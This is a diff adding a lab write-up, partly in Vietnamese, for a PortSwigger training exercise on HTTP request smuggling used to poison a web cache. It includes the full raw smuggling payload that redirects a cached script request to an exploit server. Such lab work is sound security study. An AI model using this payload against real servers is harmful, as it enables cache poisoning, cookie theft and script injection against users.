@@ -514,6 +514,49 @@ Content-Length: 18
 a=b
 ```
 ***
+## 11. Lab: Exploiting HTTP request smuggling to perform web cache poisoning
+
+* Content:
+```
+This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.
+
+To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert document.cookie.
+```
+* Exploit:
+
+<img width="476" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7930cc05-0b13-4c32-a155-3fbf3611c62a">
+
+<img width="478" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/606fd5bb-8750-426a-87ee-26cfc8096c93">
+
+Lý do dùng Smuggling Request call đến `/post/next?postId=3` là do khi này Sau khi cache, sẽ redirect đến `https://exploit-0a3a007503c0fb02809148da01a800b3.exploit-server.net/post?postId=4` (/post của máy exploit).
+
+Full Payload:
+```
+POST / HTTP/1.1
+Host: 0a4600f8039dfbc98093496b0060005c.web-security-academy.net
+Connection: close
+sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 182
+Transfer-Encoding: chunked
+
+0
 
 
+GET /post/next?postId=3 HTTP/1.1
+Host: exploit-0a3a007503c0fb02809148da01a800b3.exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
 
+a=b
+```
